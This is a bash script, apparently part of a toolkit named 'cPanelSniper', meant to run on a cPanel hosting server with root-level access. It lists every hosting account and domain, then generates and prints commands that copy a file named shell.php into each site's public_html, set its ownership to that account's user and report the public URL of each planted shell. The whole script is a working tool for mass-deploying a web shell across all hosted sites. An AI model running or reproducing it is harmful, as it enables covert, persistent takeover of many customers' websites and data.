#!/bin/bash
# Generate upload commands for all domains
# Run this on the VPS where you have access to the filesystem

SHELL_FILE="/root/cPanelSniper/shell.php"
OUTPUT_FILE="/root/cPanelSniper/upload_commands.txt"

echo "========================================"
echo "  Generate Upload Commands"
echo "========================================"
echo ""

if [ ! -f "$SHELL_FILE" ]; then
    echo "❌ Shell file not found: $SHELL_FILE"
    exit 1
fi

echo "✓ Shell file: $SHELL_FILE"
echo ""

# Get list of all accounts
echo "[1/2] Getting account list..."

# Method 1: If you have access to /etc/userdomains
if [ -f /etc/userdomains ]; then
    echo "Using /etc/userdomains..."

    # Parse userdomains file
    while IFS= read -r line; do
        [[ "$line" =~ ^# ]] && continue
        [[ -z "$line" ]] && continue

        DOMAIN=$(echo "$line" | cut -d: -f1)
        USER=$(echo "$line" | cut -d: -f2 | xargs)

        if [[ -n "$DOMAIN" && -n "$USER" ]]; then
            # Get homedir from /etc/passwd
            HOMEDIR=$(getent passwd "$USER" | cut -d: -f6)

            if [[ -n "$HOMEDIR" ]]; then
                echo "$USER|$DOMAIN|$HOMEDIR"
            fi
        fi
    done < /etc/userdomains > /tmp/accounts.txt

# Method 2: Use cPanel API (if root)
elif command -v whmapi1 &> /dev/null; then
    echo "Using whmapi1..."
    whmapi1 listaccts --output=json | jq -r '.data.acct[] | "\(.user)|\(.domain)|\(.homedir)"' > /tmp/accounts.txt

else
    echo "❌ Cannot find account list"
    echo ""
    echo "Available methods:"
    echo "  1. /etc/userdomains (direct filesystem access)"
    echo "  2. whmapi1 (cPanel CLI tool)"
    exit 1
fi

ACCOUNT_COUNT=$(wc -l < /tmp/accounts.txt)
echo "✓ Found $ACCOUNT_COUNT accounts"
echo ""

# Show accounts
echo "[2/2] Generating upload commands..."
echo ""

echo "#!/bin/bash" > "$OUTPUT_FILE"
echo "# Auto-generated upload commands" >> "$OUTPUT_FILE"
echo "# Run this script to upload shell.php to all domains" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"
echo "SHELL_FILE=\"$SHELL_FILE\"" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

cat /tmp/accounts.txt | while IFS='|' read -r user domain homedir; do
    TARGET="${homedir}/public_html/shell.php"

    cat >> "$OUTPUT_FILE" << EOF
# Upload to $domain ($user)
if [ -d "${homedir}/public_html" ]; then
    cp "\$SHELL_FILE" "${homedir}/public_html/shell.php"
    chown ${user}:${user} "${homedir}/public_html/shell.php"
    chmod 644 "${homedir}/public_html/shell.php"
    echo "✅ Uploaded to $domain → https://$domain/shell.php"
else
    echo "❌ Directory not found: ${homedir}/public_html"
fi

EOF
done

echo "✓ Commands saved to: $OUTPUT_FILE"
echo ""
echo "To upload to all domains, run:"
echo "  chmod +x $OUTPUT_FILE"
echo "  $OUTPUT_FILE"
echo ""
echo "Or upload manually:"
echo ""

cat /tmp/accounts.txt | while IFS='|' read -r user domain homedir; do
    TARGET="${homedir}/public_html/shell.php"
    echo "cp $SHELL_FILE ${TARGET} && chown ${user}:${user} ${TARGET}"
done

echo ""
echo "========================================"
echo "  Done!"
echo "========================================"

# Cleanup
rm -f /tmp/accounts.txt
